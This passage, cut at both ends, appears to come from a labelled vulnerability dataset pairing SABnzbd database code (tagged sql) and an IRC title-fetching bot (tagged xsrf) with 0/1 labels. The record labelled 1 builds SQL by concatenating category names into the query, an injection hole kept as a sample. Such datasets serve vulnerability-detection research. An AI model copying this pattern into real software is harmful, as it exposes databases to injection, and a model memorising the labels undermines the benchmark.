dictionary containing the stages and their unpack process\n    stages = decode_factory(nzo.unpack_info)\n    # Pack the dictionary up into a single string\n    # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n    lines = []\n    for key, results in stages.iteritems():\n        lines.append('%s:::%s' % (key, ';'.join(results)))\n    stage_log = '\\r\\n'.join(lines)\n\n    # Reuse the old 'report' column to indicate a URL-fetch\n    report = 'future' if nzo.futuretype else ''\n\n    # Analyze series info only when job is finished\n    series = u''\n    if postproc_time:\n        seriesname, season, episode, dummy = sabnzbd.newsunpack.analyse_show(nzo.final_name)\n        if seriesname and season and episode:\n            series = u'%s/%s/%s' % (seriesname.lower(), season, episode)\n\n    # See whatever the first password was, for the Retry\n    password = ''\n    passwords = get_all_passwords(nzo)\n    if passwords:\n        password = passwords[0]\n\n    return (completed, name, nzb_name, category, pp, script, report, url, status, nzo_id, storage, path,\n            script_log, script_line, download_time, postproc_time, stage_log, downloaded, completeness,\n            fail_message, url_info, bytes, series, nzo.md5sum, password)\n\n\n\ndef unpack_history_info(item):\n    \"\"\" Expands the single line stage_log from the DB\n        into a python dictionary for use in the history display\n    \"\"\"\n    # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n    lst = item['stage_log']\n    if lst:\n        try:\n            lines = lst.split('\\r\\n')\n        except:\n            logging.error(T('Invalid stage logging in history for %s') + ' (\\\\r\\\\n)', unicoder(item['name']))\n            logging.debug('Lines: %s', lst)\n            lines = []\n        lst = [None for x in STAGES]\n        for line in lines:\n            stage = {}\n            try:\n                key, logs = line.split(':::')\n            except:\n                logging.debug('Missing key:::logs \"%s\"', line)\n                key = line\n                logs = ''\n            stage['name'] = key\n            stage['actions'] = []\n            try:\n                logs = logs.split(';')\n            except:\n                logging.error(T('Invalid stage logging in history for %s') + ' (;)', unicoder(item['name']))\n                logging.debug('Logs: %s', logs)\n                logs = []\n            for log in logs:\n                stage['actions'].append(log)\n            try:\n                lst[STAGES[key]] = stage\n            except KeyError:\n                lst.append(stage)\n        # Remove unused stages\n        item['stage_log'] = [x for x in lst if x is not None]\n\n    if item['script_log']:\n        item['script_log'] = ''\n    # The action line is only available for items in the postproc queue\n    if 'action_line' not in item:\n        item['action_line'] = ''\n    return item\n\n\ndef midnight_history_purge():\n    logging.info('Scheduled history purge')\n    history_db = HistoryDB()\n    history_db.auto_history_purge()\n    history_db.close()\n\n\ndef decode_factory(text):\n    \"\"\" Recursively looks through the supplied argument\n        and converts and text to Unicode\n    \"\"\"\n    if isinstance(text, str):\n        return unicoder(text)\n\n    elif isinstance(text, list):\n        new_text = []\n        for t in text:\n            new_text.append(decode_factory(t))\n        return new_text\n\n    elif isinstance(text, dict):\n        new_text = {}\n        for key in text:\n            new_text[key] = decode_factory(text[key])\n        return new_text\n    else:\n        return text\n/n/n/n", "label": 0, "vtype": "sql"}, {"id": "ad9fef5f416ef31eb3fdf7c1774434092fd6a52c", "code": "/sabnzbd/database.py/n/n#!/usr/bin/python -OO\n# Copyright 2008-2017 The SABnzbd-Team <team@sabnzbd.org>\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.\n\n\"\"\"\nsabnzbd.database - Database Support\n\"\"\"\n\ntry:\n    import sqlite3\nexcept:\n    try:\n        import pysqlite2.dbapi2 as sqlite3\n    except:\n        pass\n\nimport os\nimport time\nimport zlib\nimport logging\nimport sys\nimport threading\n\nimport sabnzbd\nimport sabnzbd.cfg\nfrom sabnzbd.constants import DB_HISTORY_NAME, STAGES\nfrom sabnzbd.encoding import unicoder\nfrom sabnzbd.bpsmeter import this_week, this_month\nfrom sabnzbd.decorators import synchronized\nfrom sabnzbd.misc import get_all_passwords, int_conv\n\nDB_LOCK = threading.RLock()\n\n\ndef convert_search(search):\n    \"\"\" Convert classic wildcard to SQL wildcard \"\"\"\n    if not search:\n        # Default value\n        search = ''\n    else:\n        # Allow * for wildcard matching and space\n        search = search.replace('*', '%').replace(' ', '%')\n\n    # Allow ^ for start of string and $ for end of string\n    if search and search.startswith('^'):\n        search = search.replace('^', '')\n        search += '%'\n    elif search and search.endswith('$'):\n        search = search.replace('$', '')\n        search = '%' + search\n    else:\n        search = '%' + search + '%'\n    return search\n\n\nclass HistoryDB(object):\n    \"\"\" Class to access the History database\n        Each class-instance will create an access channel that\n        can be used in one thread.\n        Each thread needs its own class-instance!\n    \"\"\"\n    # These class attributes will be accessed directly because\n    # they need to be shared by all instances\n    db_path = None        # Will contain full path to history database\n    done_cleaning = False # Ensure we only do one Vacuum per session\n\n    @synchronized(DB_LOCK)\n    def __init__(self):\n        \"\"\" Determine databse path and create connection \"\"\"\n        self.con = self.c = None\n        if not HistoryDB.db_path:\n            HistoryDB.db_path = os.path.join(sabnzbd.cfg.admin_dir.get_path(), DB_HISTORY_NAME)\n        self.connect()\n\n\n    def connect(self):\n        \"\"\" Create a connection to the database \"\"\"\n        create_table = not os.path.exists(HistoryDB.db_path)\n        self.con = sqlite3.connect(HistoryDB.db_path)\n        self.con.row_factory = dict_factory\n        self.c = self.con.cursor()\n        if create_table:\n            self.create_history_db()\n        elif not HistoryDB.done_cleaning:\n            # Run VACUUM on sqlite\n            # When an object (table, index, or trigger) is dropped from the database, it leaves behind empty space\n            # http://www.sqlite.org/lang_vacuum.html\n            HistoryDB.done_cleaning = True\n            self.execute('VACUUM')\n\n        self.execute('PRAGMA user_version;')\n        try:\n            version = self.c.fetchone()['user_version']\n        except TypeError:\n            version = 0\n        if version < 1:\n            # Add any missing columns added since first DB version\n            # Use \"and\" to stop when database has been reset due to corruption\n            _ = self.execute('PRAGMA user_version = 1;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN series TEXT;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN md5sum TEXT;')\n        if version < 2:\n            # Add any missing columns added since second DB version\n            # Use \"and\" to stop when database has been reset due to corruption\n            _ = self.execute('PRAGMA user_version = 2;') and \\\n                self.execute('ALTER TABLE \"history\" ADD COLUMN password TEXT;')\n\n\n    def execute(self, command, args=(), save=False):\n        ''' Wrapper for executing SQL commands '''\n        for tries in xrange(5, 0, -1):\n            try:\n                if args and isinstance(args, tuple):\n                    self.c.execute(command, args)\n                else:\n                    self.c.execute(command)\n                if save:\n                    self.save()\n                return True\n            except:\n                error = str(sys.exc_value)\n                if tries >= 0 and 'is locked' in error:\n                    logging.debug('Database locked, wait and retry')\n                    time.sleep(0.5)\n                    continue\n                elif 'readonly' in error:\n                    logging.error(T('Cannot write to History database, check access rights!'))\n                    # Report back success, because there's no recovery possible\n                    return True\n                elif 'not a database' in error or 'malformed' in error or 'duplicate column name' in error:\n                    logging.error(T('Damaged History database, created empty replacement'))\n                    logging.info(\"Traceback: \", exc_info=True)\n                    self.close()\n                    try:\n                        os.remove(HistoryDB.db_path)\n                    except:\n                        pass\n                    self.connect()\n                    # Return False in case of \"duplicate column\" error\n                    # because the column addition in connect() must be terminated\n                    return 'duplicate column name' not in error\n                else:\n                    logging.error(T('SQL Command Failed, see log'))\n                    logging.debug(\"SQL: %s\", command)\n                    logging.info(\"Traceback: \", exc_info=True)\n                    try:\n                        self.con.rollback()\n                    except:\n                        logging.debug(\"Rollback Failed:\", exc_info=True)\n            return False\n\n    def create_history_db(self):\n        \"\"\" Create a new (empty) database file \"\"\"\n        self.execute(\"\"\"\n        CREATE TABLE \"history\" (\n            \"id\" INTEGER PRIMARY KEY,\n            \"completed\" INTEGER NOT NULL,\n            \"name\" TEXT NOT NULL,\n            \"nzb_name\" TEXT NOT NULL,\n            \"category\" TEXT,\n            \"pp\" TEXT,\n            \"script\" TEXT,\n            \"report\" TEXT,\n            \"url\" TEXT,\n            \"status\" TEXT,\n            \"nzo_id\" TEXT,\n            \"storage\" TEXT,\n            \"path\" TEXT,\n            \"script_log\" BLOB,\n            \"script_line\" TEXT,\n            \"download_time\" INTEGER,\n            \"postproc_time\" INTEGER,\n            \"stage_log\" TEXT,\n            \"downloaded\" INTEGER,\n            \"completeness\" INTEGER,\n            \"fail_message\" TEXT,\n            \"url_info\" TEXT,\n            \"bytes\" INTEGER,\n            \"meta\" TEXT,\n            \"series\" TEXT,\n            \"md5sum\" TEXT,\n            \"password\" TEXT\n        )\n        \"\"\")\n        self.execute('PRAGMA user_version = 2;')\n\n    def save(self):\n        \"\"\" Save database to disk \"\"\"\n        try:\n            self.con.commit()\n        except:\n            logging.error(T('SQL Commit Failed, see log'))\n            logging.info(\"Traceback: \", exc_info=True)\n\n    def close(self):\n        \"\"\" Close database connection \"\"\"\n        try:\n            self.c.close()\n            self.con.close()\n        except:\n            logging.error(T('Failed to close database, see log'))\n            logging.info(\"Traceback: \", exc_info=True)\n\n    def remove_completed(self, search=None):\n        \"\"\" Remove all completed jobs from the database, optional with `search` pattern \"\"\"\n        search = convert_search(search)\n        logging.info('Removing all completed jobs from history')\n        return self.execute(\"\"\"DELETE FROM history WHERE name LIKE ? AND status = 'Completed'\"\"\", (search,), save=True)\n\n    def get_failed_paths(self, search=None):\n        \"\"\" Return list of all storage paths of failed jobs (may contain non-existing or empty paths) \"\"\"\n        search = convert_search(search)\n        fetch_ok = self.execute(\"\"\"SELECT path FROM history WHERE name LIKE ? AND status = 'Failed'\"\"\", (search,))\n        if fetch_ok:\n            return [item.get('path') for item in self.c.fetchall()]\n        else:\n            return []\n\n    def remove_failed(self, search=None):\n        \"\"\" Remove all failed jobs from the database, optional with `search` pattern \"\"\"\n        search = convert_search(search)\n        logging.info('Removing all failed jobs from history')\n        return self.execute(\"\"\"DELETE FROM history WHERE name LIKE ? AND status = 'Failed'\"\"\", (search,), save=True)\n\n    def remove_history(self, jobs=None):\n        \"\"\" Remove all jobs in the list `jobs`, empty list will remove all completed jobs \"\"\"\n        if jobs is None:\n            self.remove_completed()\n        else:\n            if not isinstance(jobs, list):\n                jobs = [jobs]\n\n            for job in jobs:\n                self.execute(\"\"\"DELETE FROM history WHERE nzo_id=?\"\"\", (job,))\n                logging.info('Removing job %s from history', job)\n\n        self.save()\n\n    def auto_history_purge(self):\n        \"\"\" Remove history items based on the configured history-retention \"\"\"\n        if sabnzbd.cfg.history_retention() == \"0\":\n            return\n\n        if sabnzbd.cfg.history_retention() == \"-1\":\n            # Delete all non-failed ones\n            self.remove_completed()\n\n        if \"d\" in sabnzbd.cfg.history_retention():\n            # How many days to keep?\n            days_to_keep = int_conv(sabnzbd.cfg.history_retention().strip()[:-1])\n            seconds_to_keep = int(time.time()) - days_to_keep*3600*24\n            if days_to_keep > 0:\n                logging.info('Removing completed jobs older than %s days from history', days_to_keep)\n                return self.execute(\"\"\"DELETE FROM history WHERE status = 'Completed' AND completed < ?\"\"\", (seconds_to_keep,), save=True)\n        else:\n            # How many to keep?\n            to_keep = int_conv(sabnzbd.cfg.history_retention())\n            if to_keep > 0:\n                logging.info('Removing all but last %s completed jobs from history', to_keep)\n                return self.execute(\"\"\"DELETE FROM history WHERE id NOT IN ( SELECT id FROM history WHERE status = 'Completed' ORDER BY completed DESC LIMIT ? )\"\"\", (to_keep,), save=True)\n\n\n    def add_history_db(self, nzo, storage, path, postproc_time, script_output, script_line):\n        \"\"\" Add a new job entry to the database \"\"\"\n        t = build_history_info(nzo, storage, path, postproc_time, script_output, script_line)\n\n        if self.execute(\"\"\"INSERT INTO history (completed, name, nzb_name, category, pp, script, report,\n        url, status, nzo_id, storage, path, script_log, script_line, download_time, postproc_time, stage_log,\n        downloaded, completeness, fail_message, url_info, bytes, series, md5sum, password)\n        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)\"\"\", t):\n            self.save()\n        logging.info('Added job %s to history', nzo.final_name)\n\n    def fetch_history(self, start=None, limit=None, search=None, failed_only=0, categories=None):\n        \"\"\" Return records for specified jobs \"\"\"\n        search = convert_search(search)\n\n        post = ''\n        if categories:\n            categories = ['*' if c == 'Default' else c for c in categories]\n            post = \" AND (CATEGORY = '\"\n            post += \"' OR CATEGORY = '\".join(categories)\n            post += \"' )\"\n        if failed_only:\n            post += ' AND STATUS = \"Failed\"'\n\n        cmd = 'SELECT COUNT(*) FROM history WHERE name LIKE ?'\n        res = self.execute(cmd + post, (search,))\n        total_items = -1\n        if res:\n            try:\n                total_items = self.c.fetchone().get('COUNT(*)')\n            except AttributeError:\n                pass\n\n        if not start:\n            start = 0\n        if not limit:\n            limit = total_items\n\n        t = (search, start, limit)\n        cmd = 'SELECT * FROM history WHERE name LIKE ?'\n        fetch_ok = self.execute(cmd + post + ' ORDER BY completed desc LIMIT ?, ?', t)\n\n        if fetch_ok:\n            items = self.c.fetchall()\n        else:\n            items = []\n\n        fetched_items = len(items)\n\n        # Unpack the single line stage log\n        # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n        items = [unpack_history_info(item) for item in items]\n\n        return (items, fetched_items, total_items)\n\n    def have_episode(self, series, season, episode):\n        \"\"\" Check whether History contains this series episode \"\"\"\n        total = 0\n        series = series.lower().replace('.', ' ').replace('_', ' ').replace('  ', ' ')\n        if series and season and episode:\n            pattern = '%s/%s/%s' % (series, season, episode)\n            res = self.execute(\"select count(*) from History WHERE series = ? AND STATUS != 'Failed'\", (pattern,))\n            if res:\n                try:\n                    total = self.c.fetchone().get('count(*)')\n                except AttributeError:\n                    pass\n        return total > 0\n\n    def have_md5sum(self, md5sum):\n        \"\"\" Check whether this md5sum already in History \"\"\"\n        total = 0\n        res = self.execute(\"select count(*) from History WHERE md5sum = ? AND STATUS != 'Failed'\", (md5sum,))\n        if res:\n            try:\n                total = self.c.fetchone().get('count(*)')\n            except AttributeError:\n                pass\n        return total > 0\n\n    def get_history_size(self):\n        \"\"\" Returns the total size of the history and\n            amounts downloaded in the last month and week\n        \"\"\"\n        # Total Size of the history\n        total = 0\n        if self.execute('''SELECT sum(bytes) FROM history'''):\n            try:\n                total = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        # Amount downloaded this month\n        # r = time.gmtime(time.time())\n        # month_timest = int(time.mktime((r.tm_year, r.tm_mon, 0, 0, 0, 1, r.tm_wday, r.tm_yday, r.tm_isdst)))\n        month_timest = int(this_month(time.time()))\n\n        month = 0\n        if self.execute('''SELECT sum(bytes) FROM history WHERE \"completed\">?''', (month_timest,)):\n            try:\n                month = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        # Amount downloaded this week\n        week_timest = int(this_week(time.time()))\n\n        week = 0\n        if self.execute('''SELECT sum(bytes) FROM history WHERE \"completed\">?''', (week_timest,)):\n            try:\n                week = self.c.fetchone().get('sum(bytes)')\n            except AttributeError:\n                pass\n\n        return (total, month, week)\n\n    def get_script_log(self, nzo_id):\n        \"\"\" Return decompressed log file \"\"\"\n        data = ''\n        t = (nzo_id,)\n        if self.execute('SELECT script_log FROM history WHERE nzo_id=?', t):\n            try:\n                data = zlib.decompress(self.c.fetchone().get('script_log'))\n            except:\n                pass\n        return data\n\n    def get_name(self, nzo_id):\n        \"\"\" Return name of the job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        name = ''\n        if self.execute('SELECT name FROM history WHERE nzo_id=?', t):\n            try:\n                name = self.c.fetchone().get('name')\n            except AttributeError:\n                pass\n        return name\n\n    def get_path(self, nzo_id):\n        \"\"\" Return the `incomplete` path of the job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        path = ''\n        if self.execute('SELECT path FROM history WHERE nzo_id=?', t):\n            try:\n                path = self.c.fetchone().get('path')\n            except AttributeError:\n                pass\n        return path\n\n    def get_other(self, nzo_id):\n        \"\"\" Return additional data for job `nzo_id` \"\"\"\n        t = (nzo_id,)\n        if self.execute('SELECT * FROM history WHERE nzo_id=?', t):\n            try:\n                items = self.c.fetchall()[0]\n                dtype = items.get('report')\n                url = items.get('url')\n                pp = items.get('pp')\n                script = items.get('script')\n                cat = items.get('category')\n            except (AttributeError, IndexError):\n                return '', '', '', '', ''\n        return dtype, url, pp, script, cat\n\n\ndef dict_factory(cursor, row):\n    \"\"\" Return a dictionary for the current database position \"\"\"\n    d = {}\n    for idx, col in enumerate(cursor.description):\n        d[col[0]] = row[idx]\n    return d\n\n\n_PP_LOOKUP = {0: '', 1: 'R', 2: 'U', 3: 'D'}\ndef build_history_info(nzo, storage='', downpath='', postproc_time=0, script_output='', script_line=''):\n    \"\"\" Collects all the information needed for the database \"\"\"\n\n    if not downpath:\n        downpath = nzo.downpath\n    path = decode_factory(downpath)\n    storage = decode_factory(storage)\n    script_line = decode_factory(script_line)\n\n    flagRepair, flagUnpack, flagDelete = nzo.repair_opts\n    nzo_info = decode_factory(nzo.nzo_info)\n\n    url = decode_factory(nzo.url)\n\n    completed = int(time.time())\n    name = decode_factory(nzo.final_name)\n\n    nzb_name = decode_factory(nzo.filename)\n    category = decode_factory(nzo.cat)\n    pp = _PP_LOOKUP.get(sabnzbd.opts_to_pp(flagRepair, flagUnpack, flagDelete), 'X')\n    script = decode_factory(nzo.script)\n    status = decode_factory(nzo.status)\n    nzo_id = nzo.nzo_id\n    bytes = nzo.bytes_downloaded\n\n    if script_output:\n        # Compress the output of the script\n        script_log = sqlite3.Binary(zlib.compress(script_output))\n        #\n    else:\n        script_log = ''\n\n    download_time = decode_factory(nzo_info.get('download_time', 0))\n\n    downloaded = nzo.bytes_downloaded\n    completeness = 0\n    fail_message = decode_factory(nzo.fail_msg)\n    url_info = nzo_info.get('details', '') or nzo_info.get('more_info', '')\n\n    # Get the dictionary containing the stages and their unpack process\n    stages = decode_factory(nzo.unpack_info)\n    # Pack the dictionary up into a single string\n    # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n    lines = []\n    for key, results in stages.iteritems():\n        lines.append('%s:::%s' % (key, ';'.join(results)))\n    stage_log = '\\r\\n'.join(lines)\n\n    # Reuse the old 'report' column to indicate a URL-fetch\n    report = 'future' if nzo.futuretype else ''\n\n    # Analyze series info only when job is finished\n    series = u''\n    if postproc_time:\n        seriesname, season, episode, dummy = sabnzbd.newsunpack.analyse_show(nzo.final_name)\n        if seriesname and season and episode:\n            series = u'%s/%s/%s' % (seriesname.lower(), season, episode)\n\n    # See whatever the first password was, for the Retry\n    password = ''\n    passwords = get_all_passwords(nzo)\n    if passwords:\n        password = passwords[0]\n\n    return (completed, name, nzb_name, category, pp, script, report, url, status, nzo_id, storage, path,\n            script_log, script_line, download_time, postproc_time, stage_log, downloaded, completeness,\n            fail_message, url_info, bytes, series, nzo.md5sum, password)\n\n\n\ndef unpack_history_info(item):\n    \"\"\" Expands the single line stage_log from the DB\n        into a python dictionary for use in the history display\n    \"\"\"\n    # Stage Name is separated by ::: stage lines by ; and stages by \\r\\n\n    lst = item['stage_log']\n    if lst:\n        try:\n            lines = lst.split('\\r\\n')\n        except:\n            logging.error(T('Invalid stage logging in history for %s') + ' (\\\\r\\\\n)', unicoder(item['name']))\n            logging.debug('Lines: %s', lst)\n            lines = []\n        lst = [None for x in STAGES]\n        for line in lines:\n            stage = {}\n            try:\n                key, logs = line.split(':::')\n            except:\n                logging.debug('Missing key:::logs \"%s\"', line)\n                key = line\n                logs = ''\n            stage['name'] = key\n            stage['actions'] = []\n            try:\n                logs = logs.split(';')\n            except:\n                logging.error(T('Invalid stage logging in history for %s') + ' (;)', unicoder(item['name']))\n                logging.debug('Logs: %s', logs)\n                logs = []\n            for log in logs:\n                stage['actions'].append(log)\n            try:\n                lst[STAGES[key]] = stage\n            except KeyError:\n                lst.append(stage)\n        # Remove unused stages\n        item['stage_log'] = [x for x in lst if x is not None]\n\n    if item['script_log']:\n        item['script_log'] = ''\n    # The action line is only available for items in the postproc queue\n    if 'action_line' not in item:\n        item['action_line'] = ''\n    return item\n\n\ndef midnight_history_purge():\n    logging.info('Scheduled history purge')\n    history_db = HistoryDB()\n    history_db.auto_history_purge()\n    history_db.close()\n\n\ndef decode_factory(text):\n    \"\"\" Recursively looks through the supplied argument\n        and converts and text to Unicode\n    \"\"\"\n    if isinstance(text, str):\n        return unicoder(text)\n\n    elif isinstance(text, list):\n        new_text = []\n        for t in text:\n            new_text.append(decode_factory(t))\n        return new_text\n\n    elif isinstance(text, dict):\n        new_text = {}\n        for key in text:\n            new_text[key] = decode_factory(text[key])\n        return new_text\n    else:\n        return text\n/n/n/n", "label": 1, "vtype": "sql"}, {"id": "4164d239f0f59b9ef04e3d168e68f958991fe88f", "code": "titlebot.py/n/n#!/usr/bin/env python2\n# coding: utf-8\n\nimport os\nimport sys\nimport socket\nimport string\nimport time\nimport urllib2\nimport HTMLParser\nimport zlib\n\nimport libirc\n\nHOST=\"irc.freenode.net\"\nPORT=6667\nNICK=\"titlebot\"\nIDENT=\"titlebot\"\nREALNAME=\"titlebot\"\nCHANS=[\"##Orz\"]\n\ndef ParseURL(s):\n    http_idx=s.find('http:')\n    https_idx=s.find('https:')\n    if https_idx==-1:\n        if http_idx==-1:\n            return None\n        else:\n            return s[http_idx:]\n    else:\n        if http_idx==-1:\n            return s[https_idx:]\n        else:\n            return s[min(http_idx, https_idx):]\n\ntry:\n    c=libirc.IRCConnection()\n    c.connect((HOST, PORT))\n    c.setnick(NICK)\n    c.setuser(IDENT, REALNAME)\n    for CHAN in CHANS:\n        c.join(CHAN)\nexcept:\n    time.sleep(10)\n    sys.stderr.write(\"Restarting...\\n\")\n    os.execlp(\"python2\", \"python2\", __file__)\n    raise\nCHAN=CHANS[0]\nsocket.setdefaulttimeout(10)\n\nhtml_parser=HTMLParser.HTMLParser()\n\nquiting=False\nwhile not quiting:\n    if not c.sock:\n        quiting=True\n        time.sleep(10)\n        sys.stderr.write(\"Restarting...\\n\")\n        os.execlp(\"python2\", \"python2\", __file__)\n        break\n    try:\n        line=c.recvline(block=True)\n        if not line:\n            continue\n        sys.stderr.write(\"%s\\n\" % line.encode('utf-8', 'replace'))\n        line=c.parse(line=line)\n        if line and line[\"cmd\"]==\"PRIVMSG\":\n            if line[\"dest\"]==NICK:\n                if line[\"msg\"]==u\"Get out of this channel!\": # A small hack\n                    c.quit(u\"%s asked to leave.\" % line[\"nick\"])\n                    quiting=True\n            else:\n                CHAN=line[\"dest\"]\n                for w in line[\"msg\"].split():\n                    w=ParseURL(w)\n                    if w:\n                        w=w.split(\">\", 1)[0].split('\"', 1)[0]\n                        if re.match(\"https?:/*git.io(/|$)\", w): # Fix buggy git.io\n                            continue\n                        opener=urllib2.build_opener()\n                        opener.addheaders = [(\"Accept-Charset\", \"utf-8, iso-8859-1\"), (\"Accept-Language\", \"zh-cn, zh-hans, zh-tw, zh-hant, zh, en-us, en-gb, en\"), (\"Range\", \"bytes=0-16383\"), (\"User-Agent\", \"Mozilla/5.0 (compatible; Titlebot; like IRCbot; +https://github.com/m13253/titlebot)\"), (\"X-Forwarded-For\", \"10.2.0.101\"), (\"X-moz\", \"prefetch\"), (\"X-Prefetch\", \"yes\"), (\"X-Requested-With\", \"Titlebot\")]\n                        h=opener.open(w.encode(\"utf-8\", \"replace\"))\n                        if h.code==200 or h.code==206:\n                            if not \"Content-Type\" in h.info() or h.info()[\"Content-Type\"].split(\";\")[0]==\"text/html\":\n                                wbuf=h.read(16384)\n                                read_times=1\n                                while len(wbuf)<16384 and read_times<4:\n                                    read_times+=1\n                                    wbuf_=h.read(16384)\n                                    if wbuf_:\n                                        wbuf+=wbuf_\n                                    else:\n                                        break\n                                if \"Content-Encoding\" in h.info() and h.info()[\"Content-Encoding\"]==\"gzip\": # Fix buggy www.bilibili.tv\n                                    try:\n                                        gunzip_obj=zlib.decompressobj(16+zlib.MAX_WBITS)\n                                        wbuf=gunzip_obj.decompress(wbuf)\n                                    except:\n                                        pass\n                                if wbuf.find(\"<title>\")!=-1:\n                                    titleenc=wbuf.split(\"<title>\")[1].split(\"</title>\")[0]\n                                    title=None\n                                    for enc in (\"utf-8\", \"gbk\", \"gb18030\", \"iso-8859-1\"):\n                                        try:\n                                            title=titleenc.decode(enc)\n                                            break\n                                        except UnicodeDecodeError:\n                                            pass\n                                    if title==None:\n                                        title=title.decode(\"utf-8\", \"replace\")\n                                    title=html_parser.unescape(title).replace(\"\\r\", \"\").replace(\"\\n\", \" \").strip()\n                                    c.say(CHAN, u\"\u21ea\u6807\u9898: %s\" % title)\n                                else:\n                                    c.say(CHAN, u\"\u21ea\u65e0\u6807\u9898\u7f51\u9875\")\n                            else:\n                                if \"Content-Range\" in h.info():\n                                    c.say(CHAN, u\"\u21ea\u6587\u4ef6\u7c7b\u578b: %s, \u6587\u4ef6\u5927\u5c0f: %s \u5b57\u8282\\r\\n\" % (h.info()[\"Content-Type\"], h.info()[\"Content-Range\"].split(\"/\")[1]))\n                                elif \"Content-Length\" in h.info():\n                                    c.say(CHAN, u\"\u21ea\u6587\u4ef6\u7c7b\u578b: %s, \u6587\u4ef6\u5927\u5c0f: %s \u5b57\u8282\\r\\n\" % (h.info()[\"Content-Type\"], h.info()[\"Content-Length\"]))\n                                else:\n                                    c.say(CHAN, u\"\u21ea\u6587\u4ef6\u7c7b\u578b: %s\\r\\n\" % h.info()[\"Content-Type\"])\n                        else:\n                            c.say(CHAN, u\"\u21eaHTTP %d \u9519\u8bef\\r\\n\" % h.code)\n    except Exception as e:\n        try:\n            c.say(CHAN, u\"\u54ce\u5440\uff0c%s \u597d\u50cf\u51fa\u4e86\u70b9\u95ee\u9898: %s\" % (NICK, e))\n        except:\n            pass\n    except socket.error as e:\n        sys.stderr.write(\"Error: %s\\n\", e)\n        c.quit(\"Network error.\")\n\n# vim: et ft=python sts=4 sw=4 ts=4\n/n/n/n", "label": 0, "vtype": "xsrf"}, {"id": "4164d239f0f59b9ef04e3d168e68f958991fe88f", "code": "/titlebot.py/n/n#!/usr/bin/env python2\n# coding: utf-8\n\nimport os\nimport sys\nimport socket\nimport string\nimport time\nimport urllib2\nimport HTMLParser\nimport zlib\n\nimport libirc\n\nHOST=\"irc.freenode.net\"\nPORT=6667\nNICK=\"titlebot\"\nIDENT=\"titlebot\"\nREALNAME=\"titlebot\"\nCHANS=[\"##Orz\"]\n\ndef ParseURL(s):\n    http_idx=s.find('http:')\n    https_idx=s.find('https:')\n    if https_idx==-1:\n        if http_idx==-1:\n            return None\n        else:\n            return s[http_idx:]\n    else:\n        if http_idx==-1:\n            return s[https_idx:]\n        else:\n            return s[min(http_idx, https_idx):]\n\ntry:\n    c=libirc.IRCConnection()\n    c.connect((HOST, PORT))\n    c.setnick(NICK)\n    c.setuser(IDENT, REALNAME)\n    for CHAN in CHANS:\n        c.join(CHAN)\nexcept:\n    time.sleep(10)\n    sys.stderr.write(\"Restarting...\\n\")\n    os.execlp(\"python2\", \"python2\", __file__)\n    raise\nCHAN=CHANS[0]\nsocket.setdefaulttimeout(10)\n\nhtml_parser=HTMLParser.HTMLParser()\n\nquiting=False\nwhile not quiting:\n    if not c.sock:\n        quiting=True\n        time.sleep(10)\n        sys.stderr.write(\"Restarting...\\n\")\n        os.execlp(\"python2\", \"python2\", __file__)\n        break\n    try:\n        line=c.recvline(block=True)\n        if not line:\n            continue\n        sys.stderr.write(\"%s\\n\" % line.encode('utf-8', 'replace'))\n        line=c.parse(line=line)\n        if line and line[\"cmd\"]==\"PRIVMSG\":\n            if line[\"dest\"]==NICK:\n                if line[\"msg\"]==u\"Get out of this channel!\": # A small hack\n                    c.quit(u\"%s asked to leave.\" % line[\"nick\"])\n                    quiting=True\n            else:\n                CHAN=line[\"dest\"]\n                for w in line[\"msg\"].split():\n                    w=ParseURL(w)\n                    if w:\n                        w=w.split(\">\", 1)[0].split('\"', 1)[0]\n                        if re.match(\"https?:/*git.io(/|$)\", w): # Fix buggy git.io\n                            continue\n                        opener=urllib2.build_opener()\n                        opener.addheaders = [(\"Accept-Charset\", \"utf-8, iso-8859-1\"), (\"Accept-Language\", \"zh-cn, zh-hans, zh-tw, zh-hant, zh, en-us, en-gb, en\"), (\"Range\", \"bytes=0-16383\"), (\"User-Agent\", \"Mozilla/5.0 (compatible; Titlebot; like IRCbot; +https://github.com/m13253/titlebot)\"), (\"X-Forwarded-For\", \"10.2.0.101\"), (\"X-moz\", \"prefetch\"), (\"X-Prefetch\", \"yes\")]\n                        h=opener.open(w.encode(\"utf-8\", \"replace\"))\n                        if h.code==200 or h.code==206:\n                            if not \"Content-Type\" in h.info() or h.info()[\"Content-Type\"].split(\";\")[0]==\"text/html\":\n                                wbuf=h.read(16384)\n                                read_times=1\n                                while len(wbuf)<16384 and read_times<4:\n                                    read_times+=1\n                                    wbuf_=h.read(16384)\n                                    if wbuf_:\n                                        wbuf+=wbuf_\n                                    else:\n                                        break\n                                if \"Content-Encoding\" in h.info() and h.info()[\"Content-Encoding\"]==\"gzip\": # Fix buggy www.bilibili.tv\n                                    try:\n                                        gunzip_obj=zlib.decompressobj(16+zlib.MAX_WBITS)\n                                        wbuf=gunzip_obj.decompress(wbuf)\n                                    except:\n                                        pass\n                                if wbuf.find(\"<title>\")!=-1:\n                                    titleenc=wbuf.split(\"<title>\")[1].split(\"</title>\")[0]\n                                    title=None\n                                    for enc in (\"utf-8\", \"gbk\", \"gb18030\", \"iso-8859-1\"):\n                                        try:\n                                            title=titleenc.decode(enc)\n                                            break\n                                        except UnicodeDecodeError:\n                                            pass\n                                    if title==None:\n                                        title=title.decode(\"utf-8\", \"replace\")\n                                    